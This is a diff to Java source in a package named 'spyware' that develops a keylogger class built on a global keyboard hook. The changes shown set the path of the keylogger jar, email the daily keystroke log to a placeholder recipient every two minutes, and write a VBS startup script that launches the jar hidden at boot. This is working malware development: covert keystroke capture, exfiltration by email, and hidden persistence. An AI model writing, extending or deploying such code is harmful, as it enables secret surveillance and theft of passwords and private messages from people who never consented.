@@ -1,6 +1,7 @@
 package spyware;
 
 import java.io.BufferedWriter;
+
 import java.io.File;
 import java.io.FileWriter;
 import java.io.IOException;
@@ -23,10 +24,11 @@ import com.github.kwhat.jnativehook.NativeHookException;
 import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
 import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
 
-public class Keylogger  implements NativeKeyListener{
+public class Keylogger implements NativeKeyListener{
 	
      private static String LOG_DIRECTORY = System.getProperty("user.home") + File.separator + "Documents" + File.separator + "logs";
 	 private static String LOG_FILE_PATH;
+	 private static String LOG_APPLICATION_PATH = System.getProperty("user.home") + File.separator + "Desktop" + File.separator + "TestKl3.jar";
 	 private static LocalDate currentDate;
 	 
 	 static {
@@ -90,10 +92,11 @@ public class Keylogger  implements NativeKeyListener{
 	        		mc.addMailcap("text/plain;; x-java-content-handler=com.sun.mail.handlers.text_plain"); 
 	        		mc.addMailcap("multipart/*;; x-java-content-handler=com.sun.mail.handlers.multipart_mixed"); 
 	        		mc.addMailcap("message/rfc822;; x-java-content- handler=com.sun.mail.handlers.message_rfc822");
-	            	 createLogDirectoryIfNeeded();
+	            	createLogDirectoryIfNeeded();
 	            	
-	                DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd");
-	                String logFilePath = "C:\\Users\\User\\Documents\\logs\\log-" + LocalDate.now().format(formatter) + ".txt";
+	            	//Delete
+//	                DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd");
+//	                String logFilePath = LOG_FILE_PATH + LocalDate.now().format(formatter) + ".txt";
 	                
 	                
 	                EmailSender.sendEmail(
@@ -104,13 +107,13 @@ public class Keylogger  implements NativeKeyListener{
 	                    "recipient_email@example.com", // Recipient email
 	                    "Daily Keylogger Log", // Subject
 	                    "Please find the attached keylogger log for today.", // Message
-	                    logFilePath // Attachment
+	                    LOG_FILE_PATH // Attachment
 	                );
 	                System.out.println("Email sent successfully!");
 	            } catch (Exception e) {
 	                e.printStackTrace();
 	            }
-	        },  0, 1, TimeUnit.MINUTES);
+	        },  0, 2, TimeUnit.MINUTES);
 	    }
 	    
 	    private static void addAppToStartup() {
@@ -121,7 +124,7 @@ public class Keylogger  implements NativeKeyListener{
 
 	            // Cria o conteúdo do arquivo .vbs
 	            String vbsContent = "Set WshShell = CreateObject(\"WScript.Shell\")\n"
-	            		+ "WshShell.Run \"java -jar C:\\Users\\User\\Desktop\\TestKl.jar\", 0\n"
+	            		  + "WshShell.Run \"java -jar " + LOG_APPLICATION_PATH.toString() + "\", 0\n"
 	            		+ "Set WshShell = Nothing";
 
 	            // Escreve o conteúdo no arquivo .vbs
